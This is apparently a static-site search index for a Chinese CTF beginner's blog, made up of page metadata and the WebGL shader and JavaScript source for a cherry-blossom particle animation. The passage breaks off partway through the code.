{"meta":{"title":"大周'blog","subtitle":"ctf","description":"ctf萌新","author":"奝","url":"http://lingxin16.github.io","root":"/"},"pages":[{"title":"关于我","date":"2019-12-05T12:37:07.000Z","updated":"2020-04-11T09:46:01.879Z","comments":false,"path":"about/index.html","permalink":"http://lingxin16.github.io/about/index.html","excerpt":"","text":"干啥啥不行,吃饭第一名."},{"title":"comment","date":"2020-04-11T08:12:48.000Z","updated":"2020-04-11T09:20:47.248Z","comments":true,"path":"comment/index.html","permalink":"http://lingxin16.github.io/comment/index.html","excerpt":"","text":""},{"title":"links","date":"2020-04-11T09:23:54.000Z","updated":"2020-05-11T02:22:47.652Z","comments":true,"path":"links/index.html","permalink":"http://lingxin16.github.io/links/index.html","excerpt":"","text":""},{"title":"","date":"2020-04-18T15:09:15.896Z","updated":"2020-04-18T15:09:15.896Z","comments":true,"path":"营销生成器/index.html","permalink":"http://lingxin16.github.io/%E8%90%A5%E9%94%80%E7%94%9F%E6%88%90%E5%99%A8/index.html","excerpt":"","text":"营销号生成器 营销号生成器 主体： 事件： 另一种说法： Made by: Kasei L2Dwidget.init({\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false});"},{"title":"","date":"2020-01-04T06:30:38.392Z","updated":"2020-01-04T06:30:38.392Z","comments":true,"path":"sakura/index.html","permalink":"http://lingxin16.github.io/sakura/index.html","excerpt":"","text":"送你一场樱花雨 canvas { padding:0; margin:0; position: absolute; z-index: -1; left:0px; } uniform mat4 uProjection; uniform mat4 uModelview; uniform vec3 uResolution; uniform vec3 uOffset; uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start attribute vec3 aPosition; attribute vec3 aEuler; attribute vec2 aMisc; //x:size, y:fade varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; void main(void) { // Projection is based on vertical angle vec4 pos = uModelview * vec4(aPosition + uOffset, 1.0); gl_Position = uProjection * pos; gl_PointSize = aMisc.x * uProjection[1][1] / -pos.z * uResolution.y * 0.5; pposition = pos.xyz; psize = aMisc.x; pdist = length(pos.xyz); palpha = smoothstep(0.0, 1.0, (pdist - 0.1) / uFade.z); vec3 elrsn = sin(aEuler); vec3 elrcs = cos(aEuler); mat3 rotx = mat3( 1.0, 0.0, 0.0, 0.0, elrcs.x, elrsn.x, 0.0, -elrsn.x, elrcs.x ); mat3 roty = mat3( elrcs.y, 0.0, -elrsn.y, 0.0, 1.0, 0.0, elrsn.y, 0.0, elrcs.y ); mat3 rotz = mat3( elrcs.z, elrsn.z, 0.0, -elrsn.z, elrcs.z, 0.0, 0.0, 0.0, 1.0 ); mat3 rotmat = rotx * roty * rotz; normal = rotmat[2]; mat3 trrotm = mat3( rotmat[0][0], rotmat[1][0], rotmat[2][0], rotmat[0][1], rotmat[1][1], rotmat[2][1], rotmat[0][2], rotmat[1][2], rotmat[2][2] ); normX = trrotm[0]; normY = trrotm[1]; normZ = trrotm[2]; const vec3 lit = vec3(0.6917144638660746, 0.6917144638660746, -0.20751433915982237); float tmpdfs = dot(lit, normal); if(tmpdfs < 0.0) { normal = -normal; tmpdfs = dot(lit, normal); } diffuse = 0.4 + tmpdfs; vec3 eyev = normalize(-pos.xyz); if(dot(eyev, normal) > 0.0) { vec3 hv = normalize(eyev + lit); specular = pow(max(dot(hv, normal), 0.0), 20.0); } else { specular = 0.0; } rstop = clamp((abs(pdist - uDOF.x) - uDOF.y) / uDOF.z, 0.0, 1.0); rstop = pow(rstop, 0.5); //-0.69315 = ln(0.5) distancefade = min(1.0, exp((uFade.x - pdist) * 0.69315 / uFade.y)); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec3 uDOF; //x:focus distance, y:focus radius, z:max radius uniform vec3 uFade; //x:start distance, y:half distance, z:near fade start const vec3 fadeCol = vec3(0.08, 0.03, 0.06); varying vec3 pposition; varying float psize; varying float palpha; varying float pdist; //varying mat3 rotMat; varying vec3 normX; varying vec3 normY; varying vec3 normZ; varying vec3 normal; varying float diffuse; varying float specular; varying float rstop; varying float distancefade; float ellipse(vec2 p, vec2 o, vec2 r) { vec2 lp = (p - o) / r; return length(lp) - 1.0; } void main(void) { vec3 p = vec3(gl_PointCoord - vec2(0.5, 0.5), 0.0) * 2.0; vec3 d = vec3(0.0, 0.0, -1.0); float nd = normZ.z; //dot(-normZ, d); if(abs(nd) < 0.0001) discard; float np = dot(normZ, p); vec3 tp = p + d * np / nd; vec2 coord = vec2(dot(normX, tp), dot(normY, tp)); //angle = 15 degree const float flwrsn = 0.258819045102521; const float flwrcs = 0.965925826289068; mat2 flwrm = mat2(flwrcs, -flwrsn, flwrsn, flwrcs); vec2 flwrp = vec2(abs(coord.x), coord.y) * flwrm; float r; if(flwrp.x < 0.0) { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.36, 0.96) * 0.5); } else { r = ellipse(flwrp, vec2(0.065, 0.024) * 0.5, vec2(0.58, 0.96) * 0.5); } if(r > rstop) discard; vec3 col = mix(vec3(1.0, 0.8, 0.75), vec3(1.0, 0.9, 0.87), r); float grady = mix(0.0, 1.0, pow(coord.y * 0.5 + 0.5, 0.35)); col *= vec3(1.0, grady, grady); col *= mix(0.8, 1.0, pow(abs(coord.x), 0.3)); col = col * diffuse + specular; col = mix(fadeCol, col, distancefade); float alpha = (rstop > 0.001)? (0.5 - r / (rstop * 2.0)) : 1.0; alpha = smoothstep(0.0, 1.0, alpha) * palpha; gl_FragColor = vec4(col * 0.5, alpha); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform vec2 uTimes; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec3 col; float c; vec2 tmpv = texCoord * vec2(0.8, 1.0) - vec2(0.95, 1.0); c = exp(-pow(length(tmpv) * 1.8, 2.0)); col = mix(vec3(0.02, 0.0, 0.03), vec3(0.96, 0.98, 1.0) * 1.5, c); gl_FragColor = vec4(col * 0.5, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); gl_FragColor = vec4(col.rgb * 2.0 - vec3(0.5), 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; uniform vec4 uBlurDir; //dir(x, y), stride(z, w) varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 col = texture2D(uSrc, texCoord); col = col + texture2D(uSrc, texCoord + uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord - uBlurDir.xy * uDelta); col = col + texture2D(uSrc, texCoord + (uBlurDir.xy + uBlurDir.zw) * uDelta); col = col + texture2D(uSrc, texCoord - (uBlurDir.xy + uBlurDir.zw) * uDelta); gl_FragColor = col / 5.0; } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_FragColor = texture2D(uSrc, texCoord); } uniform vec3 uResolution; attribute vec2 aPosition; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { gl_Position = vec4(aPosition, 0.0, 1.0); texCoord = aPosition.xy * 0.5 + vec2(0.5, 0.5); screenCoord = aPosition.xy * vec2(uResolution.z, 1.0); } #ifdef GL_ES //precision mediump float; precision highp float; #endif uniform sampler2D uSrc; uniform sampler2D uBloom; uniform vec2 uDelta; varying vec2 texCoord; varying vec2 screenCoord; void main(void) { vec4 srccol = texture2D(uSrc, texCoord) * 2.0; vec4 bloomcol = texture2D(uBloom, texCoord); vec4 col; col = srccol + bloomcol * (vec4(1.0) + srccol); col *= smoothstep(1.0, 0.0, pow(length((texCoord - vec2(0.5)) * 2.0), 1.2) * 0.5); col = pow(col, vec4(0.45454545454545)); //(1.0 / 2.2) gl_FragColor = vec4(col.rgb, 1.0); gl_FragColor.a = 1.0; } L2Dwidget.init({\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false}); // Utilities var Vector3 = {}; var Matrix44 = {}; Vector3.create = function(x, y, z) { return {'x':x, 'y':y, 'z':z}; }; Vector3.dot = function (v0, v1) { return v0.x * v1.x + v0.y * v1.y + v0.z * v1.z; }; Vector3.cross = function (v, v0, v1) { v.x = v0.y * v1.z - v0.z * v1.y; v.y = v0.z * v1.x - v0.x * v1.z; v.z = v0.x * v1.y - v0.y * v1.x; }; Vector3.normalize = function (v) { var l = v.x * v.x + v.y * v.y + v.z * v.z; if(l > 0.00001) { l = 1.0 / Math.sqrt(l); v.x *= l; v.y *= l; v.z *= l; } }; Vector3.arrayForm = function(v) { if(v.array) { v.array[0] = v.x; v.array[1] = v.y; v.array[2] = v.z; } else { v.array = new Float32Array([v.x, v.y, v.z]); } return v.array; }; Matrix44.createIdentity = function () { return new Float32Array([1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 1.0]); }; Matrix44.loadProjection = function (m, aspect, vdeg, near, far) { var h = near * Math.tan(vdeg * Math.PI / 180.0 * 0.5) * 2.0; var w = h * aspect; m[0] = 2.0 * near / w; m[1] = 0.0; m[2] = 0.0; m[3] = 0.0; m[4] = 0.0; m[5] = 2.0 * near / h; m[6] = 0.0; m[7] = 0.0; m[8] = 0.0; m[9] = 0.0; m[10] = -(far + near) / (far - near); m[11] = -1.0; m[12] = 0.0; m[13] = 0.0; m[14] = -2.0 * far * near / (far - near); m[15] = 0.0; }; Matrix44.loadLookAt = function (m, vpos, vlook, vup) { var frontv = Vector3.create(vpos.x - vlook.x, vpos.y - vlook.y, vpos.z - vlook.z); Vector3.normalize(frontv); var sidev = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(sidev, vup, frontv); Vector3.normalize(sidev); var topv = Vector3.create(1.0, 0.0, 0.0); Vector3.cross(topv, frontv, sidev); Vector3.normalize(topv); m[0] = sidev.x; m[1] = topv.x; m[2] = frontv.x; m[3] = 0.0; m[4] = sidev.y; m[5] = topv.y; m[6] = frontv.y; m[7] = 0.0; m[8] = sidev.z; m[9] = topv.z; m[10] = frontv.z; m[11] = 0.0; m[12] = -(vpos.x * m[0] + vpos.y * m[4] + vpos.z * m[8]); m[13] = -(vpos.x * m[1] + vpos.y * m[5] + vpos.z * m[9]); m[14] = -(vpos.x * m[2] + vpos.y * m[6] + vpos.z * m[10]); m[15] = 1.0; }; // var timeInfo = { 'start':0, 'prev':0, // Date 'delta':0, 'elapsed':0 // Number(sec) }; // var gl; var renderSpec = { 'width':0, 'height':0, 'aspect':1, 'array':new Float32Array(3), 'halfWidth':0, 'halfHeight':0, 'halfArray':new Float32Array(3) // and some render targets. see setViewport() }; renderSpec.setSize = function(w, h) { renderSpec.width = w; renderSpec.height = h; renderSpec.aspect = renderSpec.width / renderSpec.height; renderSpec.array[0] = renderSpec.width; renderSpec.array[1] = renderSpec.height; renderSpec.array[2] = renderSpec.aspect; renderSpec.halfWidth = Math.floor(w / 2); renderSpec.halfHeight = Math.floor(h / 2); renderSpec.halfArray[0] = renderSpec.halfWidth; renderSpec.halfArray[1] = renderSpec.halfHeight; renderSpec.halfArray[2] = renderSpec.halfWidth / renderSpec.halfHeight; }; function deleteRenderTarget(rt) { gl.deleteFramebuffer(rt.frameBuffer); gl.deleteRenderbuffer(rt.renderBuffer); gl.deleteTexture(rt.texture); } function createRenderTarget(w, h) { var ret = { 'width':w, 'height':h, 'sizeArray':new Float32Array([w, h, w / h]), 'dtxArray':new Float32Array([1.0 / w, 1.0 / h]) }; ret.frameBuffer = gl.createFramebuffer(); ret.renderBuffer = gl.createRenderbuffer(); ret.texture = gl.createTexture(); gl.bindTexture(gl.TEXTURE_2D, ret.texture); gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, w, h, 0, gl.RGBA, gl.UNSIGNED_BYTE, null); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR); gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR); gl.bindFramebuffer(gl.FRAMEBUFFER, ret.frameBuffer); gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, ret.texture, 0); gl.bindRenderbuffer(gl.RENDERBUFFER, ret.renderBuffer); gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH_COMPONENT16, w, h); gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.DEPTH_ATTACHMENT, gl.RENDERBUFFER, ret.renderBuffer); gl.bindTexture(gl.TEXTURE_2D, null); gl.bindRenderbuffer(gl.RENDERBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, null); return ret; } function compileShader(shtype, shsrc) { var retsh = gl.createShader(shtype); gl.shaderSource(retsh, shsrc); gl.compileShader(retsh); if(!gl.getShaderParameter(retsh, gl.COMPILE_STATUS)) { var errlog = gl.getShaderInfoLog(retsh); gl.deleteShader(retsh); console.error(errlog); return null; } return retsh; } function createShader(vtxsrc, frgsrc, uniformlist, attrlist) { var vsh = compileShader(gl.VERTEX_SHADER, vtxsrc); var fsh = compileShader(gl.FRAGMENT_SHADER, frgsrc); if(vsh == null || fsh == null) { return null; } var prog = gl.createProgram(); gl.attachShader(prog, vsh); gl.attachShader(prog, fsh); gl.deleteShader(vsh); gl.deleteShader(fsh); gl.linkProgram(prog); if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) { var errlog = gl.getProgramInfoLog(prog); console.error(errlog); return null; } if(uniformlist) { prog.uniforms = {}; for(var i = 0; i < uniformlist.length; i++) { prog.uniforms[uniformlist[i]] = gl.getUniformLocation(prog, uniformlist[i]); } } if(attrlist) { prog.attributes = {}; for(var i = 0; i < attrlist.length; i++) { var attr = attrlist[i]; prog.attributes[attr] = gl.getAttribLocation(prog, attr); } } return prog; } function useShader(prog) { gl.useProgram(prog); for(var attr in prog.attributes) { gl.enableVertexAttribArray(prog.attributes[attr]);; } } function unuseShader(prog) { for(var attr in prog.attributes) { gl.disableVertexAttribArray(prog.attributes[attr]);; } gl.useProgram(null); } ///// var projection = { 'angle':60, 'nearfar':new Float32Array([0.1, 100.0]), 'matrix':Matrix44.createIdentity() }; var camera = { 'position':Vector3.create(0, 0, 100), 'lookat':Vector3.create(0, 0, 0), 'up':Vector3.create(0, 1, 0), 'dof':Vector3.create(10.0, 4.0, 8.0), 'matrix':Matrix44.createIdentity() }; var pointFlower = {}; var meshFlower = {}; var sceneStandBy = false; var BlossomParticle = function () { this.velocity = new Array(3); this.rotation = new Array(3); this.position = new Array(3); this.euler = new Array(3); this.size = 1.0; this.alpha = 1.0; this.zkey = 0.0; }; BlossomParticle.prototype.setVelocity = function (vx, vy, vz) { this.velocity[0] = vx; this.velocity[1] = vy; this.velocity[2] = vz; }; BlossomParticle.prototype.setRotation = function (rx, ry, rz) { this.rotation[0] = rx; this.rotation[1] = ry; this.rotation[2] = rz; }; BlossomParticle.prototype.setPosition = function (nx, ny, nz) { this.position[0] = nx; this.position[1] = ny; this.position[2] = nz; }; BlossomParticle.prototype.setEulerAngles = function (rx, ry, rz) { this.euler[0] = rx; this.euler[1] = ry; this.euler[2] = rz; }; BlossomParticle.prototype.setSize = function (s) { this.size = s; }; BlossomParticle.prototype.update = function (dt, et) { this.position[0] += this.velocity[0] * dt; this.position[1] += this.velocity[1] * dt; this.position[2] += this.velocity[2] * dt; this.euler[0] += this.rotation[0] * dt; this.euler[1] += this.rotation[1] * dt; this.euler[2] += this.rotation[2] * dt; }; function createPointFlowers() { // get point sizes var prm = gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE); renderSpec.pointSize = {'min':prm[0], 'max':prm[1]}; var vtxsrc = document.getElementById(\"sakura_point_vsh\").textContent; var frgsrc = document.getElementById(\"sakura_point_fsh\").textContent; pointFlower.program = createShader( vtxsrc, frgsrc, ['uProjection', 'uModelview', 'uResolution', 'uOffset', 'uDOF', 'uFade'], ['aPosition', 'aEuler', 'aMisc'] ); useShader(pointFlower.program); pointFlower.offset = new Float32Array([0.0, 0.0, 0.0]); pointFlower.fader = Vector3.create(0.0, 10.0, 0.0); // paramerters: velocity[3], rotate[3] pointFlower.numFlowers = 1600; pointFlower.particles = new Array(pointFlower.numFlowers); // vertex attributes {position[3], euler_xyz[3], size[1]} pointFlower.dataArray = new Float32Array(pointFlower.numFlowers * (3 + 3 + 2)); pointFlower.positionArrayOffset = 0; pointFlower.eulerArrayOffset = pointFlower.numFlowers * 3; pointFlower.miscArrayOffset = pointFlower.numFlowers * 6; pointFlower.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(pointFlower.program); for(var i = 0; i < pointFlower.numFlowers; i++) { pointFlower.particles[i] = new BlossomParticle(); } } function initPointFlowers() { //area pointFlower.area = Vector3.create(20.0, 20.0, 20.0); pointFlower.area.x = pointFlower.area.y * renderSpec.aspect; pointFlower.fader.x = 10.0; //env fade start pointFlower.fader.y = pointFlower.area.z; //env fade half pointFlower.fader.z = 0.1; //near fade start //particles var PI2 = Math.PI * 2.0; var tmpv3 = Vector3.create(0, 0, 0); var tmpv = 0; var symmetryrand = function() {return (Math.random() * 2.0 - 1.0);}; for(var i = 0; i < pointFlower.numFlowers; i++) { var tmpprtcl = pointFlower.particles[i]; //velocity tmpv3.x = symmetryrand() * 0.3 + 0.8; tmpv3.y = symmetryrand() * 0.2 - 1.0; tmpv3.z = symmetryrand() * 0.3 + 0.5; Vector3.normalize(tmpv3); tmpv = 2.0 + Math.random() * 1.0; tmpprtcl.setVelocity(tmpv3.x * tmpv, tmpv3.y * tmpv, tmpv3.z * tmpv); //rotation tmpprtcl.setRotation( symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5, symmetryrand() * PI2 * 0.5 ); //position tmpprtcl.setPosition( symmetryrand() * pointFlower.area.x, symmetryrand() * pointFlower.area.y, symmetryrand() * pointFlower.area.z ); //euler tmpprtcl.setEulerAngles( Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0, Math.random() * Math.PI * 2.0 ); //size tmpprtcl.setSize(0.9 + Math.random() * 0.1); } } function renderPointFlowers() { //update var PI2 = Math.PI * 2.0; var limit = [pointFlower.area.x, pointFlower.area.y, pointFlower.area.z]; var repeatPos = function (prt, cmp, limit) { if(Math.abs(prt.position[cmp]) - prt.size * 0.5 > limit) { //out of area if(prt.position[cmp] > 0) { prt.position[cmp] -= limit * 2.0; } else { prt.position[cmp] += limit * 2.0; } } }; var repeatEuler = function (prt, cmp) { prt.euler[cmp] = prt.euler[cmp] % PI2; if(prt.euler[cmp] < 0.0) { prt.euler[cmp] += PI2; } }; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; prtcl.update(timeInfo.delta, timeInfo.elapsed); repeatPos(prtcl, 0, pointFlower.area.x); repeatPos(prtcl, 1, pointFlower.area.y); repeatPos(prtcl, 2, pointFlower.area.z); repeatEuler(prtcl, 0); repeatEuler(prtcl, 1); repeatEuler(prtcl, 2); prtcl.alpha = 1.0;//(pointFlower.area.z - prtcl.position[2]) * 0.5; prtcl.zkey = (camera.matrix[2] * prtcl.position[0] + camera.matrix[6] * prtcl.position[1] + camera.matrix[10] * prtcl.position[2] + camera.matrix[14]); } // sort pointFlower.particles.sort(function(p0, p1){return p0.zkey - p1.zkey;}); // update data var ipos = pointFlower.positionArrayOffset; var ieuler = pointFlower.eulerArrayOffset; var imisc = pointFlower.miscArrayOffset; for(var i = 0; i < pointFlower.numFlowers; i++) { var prtcl = pointFlower.particles[i]; pointFlower.dataArray[ipos] = prtcl.position[0]; pointFlower.dataArray[ipos + 1] = prtcl.position[1]; pointFlower.dataArray[ipos + 2] = prtcl.position[2]; ipos += 3; pointFlower.dataArray[ieuler] = prtcl.euler[0]; pointFlower.dataArray[ieuler + 1] = prtcl.euler[1]; pointFlower.dataArray[ieuler + 2] = prtcl.euler[2]; ieuler += 3; pointFlower.dataArray[imisc] = prtcl.size; pointFlower.dataArray[imisc + 1] = prtcl.alpha; imisc += 2; } //draw gl.enable(gl.BLEND); //gl.disable(gl.DEPTH_TEST); gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA); var prog = pointFlower.program; useShader(prog); gl.uniformMatrix4fv(prog.uniforms.uProjection, false, projection.matrix); gl.uniformMatrix4fv(prog.uniforms.uModelview, false, camera.matrix); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); gl.uniform3fv(prog.uniforms.uDOF, Vector3.arrayForm(camera.dof)); gl.uniform3fv(prog.uniforms.uFade, Vector3.arrayForm(pointFlower.fader)); gl.bindBuffer(gl.ARRAY_BUFFER, pointFlower.buffer); gl.bufferData(gl.ARRAY_BUFFER, pointFlower.dataArray, gl.DYNAMIC_DRAW); gl.vertexAttribPointer(prog.attributes.aPosition, 3, gl.FLOAT, false, 0, pointFlower.positionArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aEuler, 3, gl.FLOAT, false, 0, pointFlower.eulerArrayOffset * Float32Array.BYTES_PER_ELEMENT); gl.vertexAttribPointer(prog.attributes.aMisc, 2, gl.FLOAT, false, 0, pointFlower.miscArrayOffset * Float32Array.BYTES_PER_ELEMENT); // doubler for(var i = 1; i < 2; i++) { var zpos = i * -2.0; pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * -1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * -1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); pointFlower.offset[0] = pointFlower.area.x * 1.0; pointFlower.offset[1] = pointFlower.area.y * 1.0; pointFlower.offset[2] = pointFlower.area.z * zpos; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); } //main pointFlower.offset[0] = 0.0; pointFlower.offset[1] = 0.0; pointFlower.offset[2] = 0.0; gl.uniform3fv(prog.uniforms.uOffset, pointFlower.offset); gl.drawArrays(gl.POINT, 0, pointFlower.numFlowers); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(prog); gl.enable(gl.DEPTH_TEST); gl.disable(gl.BLEND); } // effects //common util function createEffectProgram(vtxsrc, frgsrc, exunifs, exattrs) { var ret = {}; var unifs = ['uResolution', 'uSrc', 'uDelta']; if(exunifs) { unifs = unifs.concat(exunifs); } var attrs = ['aPosition']; if(exattrs) { attrs = attrs.concat(exattrs); } ret.program = createShader(vtxsrc, frgsrc, unifs, attrs); useShader(ret.program); ret.dataArray = new Float32Array([ -1.0, -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, 1.0 ]); ret.buffer = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, ret.buffer); gl.bufferData(gl.ARRAY_BUFFER, ret.dataArray, gl.STATIC_DRAW); gl.bindBuffer(gl.ARRAY_BUFFER, null); unuseShader(ret.program); return ret; } // basic usage // useEffect(prog, srctex({'texture':texid, 'dtxArray':(f32)[dtx, dty]})); //basic initialize // gl.uniform**(...); //additional uniforms // drawEffect() // unuseEffect(prog) // TEXTURE0 makes src function useEffect(fxobj, srctex) { var prog = fxobj.program; useShader(prog); gl.uniform3fv(prog.uniforms.uResolution, renderSpec.array); if(srctex != null) { gl.uniform2fv(prog.uniforms.uDelta, srctex.dtxArray); gl.uniform1i(prog.uniforms.uSrc, 0); gl.activeTexture(gl.TEXTURE0); gl.bindTexture(gl.TEXTURE_2D, srctex.texture); } } function drawEffect(fxobj) { gl.bindBuffer(gl.ARRAY_BUFFER, fxobj.buffer); gl.vertexAttribPointer(fxobj.program.attributes.aPosition, 2, gl.FLOAT, false, 0, 0); gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4); } function unuseEffect(fxobj) { unuseShader(fxobj.program); } var effectLib = {}; function createEffectLib() { var vtxsrc, frgsrc; //common var cmnvtxsrc = document.getElementById(\"fx_common_vsh\").textContent; //background frgsrc = document.getElementById(\"bg_fsh\").textContent; effectLib.sceneBg = createEffectProgram(cmnvtxsrc, frgsrc, ['uTimes'], null); // make brightpixels buffer frgsrc = document.getElementById(\"fx_brightbuf_fsh\").textContent; effectLib.mkBrightBuf = createEffectProgram(cmnvtxsrc, frgsrc, null, null); // direction blur frgsrc = document.getElementById(\"fx_dirblur_r4_fsh\").textContent; effectLib.dirBlur = createEffectProgram(cmnvtxsrc, frgsrc, ['uBlurDir'], null); //final composite vtxsrc = document.getElementById(\"pp_final_vsh\").textContent; frgsrc = document.getElementById(\"pp_final_fsh\").textContent; effectLib.finalComp = createEffectProgram(vtxsrc, frgsrc, ['uBloom'], null); } // background function createBackground() { //console.log(\"create background\"); } function initBackground() { //console.log(\"init background\"); } function renderBackground() { gl.disable(gl.DEPTH_TEST); useEffect(effectLib.sceneBg, null); gl.uniform2f(effectLib.sceneBg.program.uniforms.uTimes, timeInfo.elapsed, timeInfo.delta); drawEffect(effectLib.sceneBg); unuseEffect(effectLib.sceneBg); gl.enable(gl.DEPTH_TEST); } // post process var postProcess = {}; function createPostProcess() { //console.log(\"create post process\"); } function initPostProcess() { //console.log(\"init post process\"); } function renderPostProcess() { gl.enable(gl.TEXTURE_2D); gl.disable(gl.DEPTH_TEST); var bindRT = function (rt, isclear) { gl.bindFramebuffer(gl.FRAMEBUFFER, rt.frameBuffer); gl.viewport(0, 0, rt.width, rt.height); if(isclear) { gl.clearColor(0, 0, 0, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); } }; //make bright buff bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.mkBrightBuf, renderSpec.mainRT); drawEffect(effectLib.mkBrightBuf); unuseEffect(effectLib.mkBrightBuf); // make bloom for(var i = 0; i < 2; i++) { var p = 1.5 + 1 * i; var s = 2.0 + 1 * i; bindRT(renderSpec.wHalfRT1, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT0); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, p, 0.0, s, 0.0); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); bindRT(renderSpec.wHalfRT0, true); useEffect(effectLib.dirBlur, renderSpec.wHalfRT1); gl.uniform4f(effectLib.dirBlur.program.uniforms.uBlurDir, 0.0, p, 0.0, s); drawEffect(effectLib.dirBlur); unuseEffect(effectLib.dirBlur); } //display gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.viewport(0, 0, renderSpec.width, renderSpec.height); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); useEffect(effectLib.finalComp, renderSpec.mainRT); gl.uniform1i(effectLib.finalComp.program.uniforms.uBloom, 1); gl.activeTexture(gl.TEXTURE1); gl.bindTexture(gl.TEXTURE_2D, renderSpec.wHalfRT0.texture); drawEffect(effectLib.finalComp); unuseEffect(effectLib.finalComp); gl.enable(gl.DEPTH_TEST); } ///// var SceneEnv = {}; function createScene() { createEffectLib(); createBackground(); createPointFlowers(); createPostProcess(); sceneStandBy = true; } function initScene() { initBackground(); initPointFlowers(); initPostProcess(); //camera.position.z = 17.320508; camera.position.z = pointFlower.area.z + projection.nearfar[0]; projection.angle = Math.atan2(pointFlower.area.y, camera.position.z + pointFlower.area.z) * 180.0 / Math.PI * 2.0; Matrix44.loadProjection(projection.matrix, renderSpec.aspect, projection.angle, projection.nearfar[0], projection.nearfar[1]); } function renderScene() { //draw Matrix44.loadLookAt(camera.matrix, camera.position, camera.lookat, camera.up); gl.enable(gl.DEPTH_TEST); //gl.bindFramebuffer(gl.FRAMEBUFFER, null); gl.bindFramebuffer(gl.FRAMEBUFFER, renderSpec.mainRT.frameBuffer); gl.viewport(0, 0, renderSpec.mainRT.width, renderSpec.mainRT.height); gl.clearColor(0.005, 0, 0.05, 0); gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT); renderBackground(); renderPointFlowers(); renderPostProcess(); } ///// function onResize(e) { makeCanvasFullScreen(document.getElementById(\"sakura\")); setViewports(); if(sceneStandBy) { initScene(); } } function 